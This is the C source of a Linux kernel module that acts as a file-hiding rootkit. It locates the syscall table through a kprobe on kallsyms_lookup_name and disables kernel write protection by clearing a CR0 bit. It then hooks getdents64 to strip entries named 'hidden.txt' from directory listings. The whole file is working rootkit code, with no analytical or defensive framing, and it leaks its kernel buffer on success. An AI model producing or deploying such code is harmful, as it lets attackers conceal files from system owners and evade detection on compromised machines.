#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>

#define HIDE_ME "hidden.txt"

typedef long (*getdents64_t)(const struct pt_regs *pt_registers);
getdents64_t org_getdents64;
unsigned long * syscall_table;

MODULE_LICENSE("GPL");

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

asmlinkage long sys_getdents64_hook(const struct pt_regs *pt_registers) {
  int ret = org_getdents64(pt_registers);
  int err;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  struct linux_dirent64 *dirent = (struct linux_dirent64 *) pt_registers->si;
  unsigned long i = 0;

  printk(KERN_INFO "HOOKED2");
  if (ret <= 0) {
    return ret;
  }

  kdirent = kvzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL) {
    return ret;
  }

  err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);
  if (err) {
    kvfree(kdirent);
    return ret;
  }

  while (i < ret) {
   dir = (void*) kdirent + i;
   if (memcmp(HIDE_ME, (char *)dir->d_name, strlen(HIDE_ME)) == 0) {
     printk(KERN_ALERT "found the HIDE_ME file");
     if (dir == kdirent) {
       // first dirent in chain
       ret -= dir->d_reclen;
       memmove(dir, (void*)dir + dir->d_reclen, ret);
       continue;
     }
     prev->d_reclen += dir->d_reclen;
   }
   else {
     prev = dir;
   }
   i += dir->d_reclen;
  }
  
  err = copy_to_user(dirent, kdirent, (unsigned long) ret);
  if (err) {
    kvfree(kdirent);
    return ret;
  }
  return ret;
}

extern unsigned long __force_order;
static inline void mywrite_cr0(unsigned long value) {
  asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}
       

static unsigned long * get_syscall_table(void) {
  /* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;

  /* register the kprobe */
  register_kprobe(&kp);

  /* assign kallsyms_lookup_name symbol to kp.addr */
  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    
  /* done with the kprobe, so unregister it */
  unregister_kprobe(&kp);
  return (unsigned long *) kallsyms_lookup_name("sys_call_table");
}

static int __init replace_getdents_syscall(void) {
  printk(KERN_INFO "init");
  unsigned long orig_cr0;
  syscall_table = get_syscall_table();
  printk(KERN_INFO "2");
  if (syscall_table == 0) {
    printk(KERN_ALERT "replace_getdents_syscall: could not get syscall table address");
    return 0;
  }
  printk(KERN_INFO "3");
  orig_cr0 = read_cr0();
  mywrite_cr0(orig_cr0 & (~0x10000));
  org_getdents64 = (getdents64_t)syscall_table[__NR_getdents64];
  printk(KERN_INFO "org_getdents64: %lx", org_getdents64);
  syscall_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
  mywrite_cr0(orig_cr0);
  return 0;
}

static void __exit clear(void) {
  unsigned long orig_cr0;
  if (syscall_table != 0) {
    orig_cr0 = read_cr0();
    mywrite_cr0(orig_cr0 & (~0x10000));
    syscall_table[__NR_getdents64] = (long unsigned int) org_getdents64;
    mywrite_cr0(orig_cr0);
  }
}

module_init(replace_getdents_syscall);
module_exit(clear);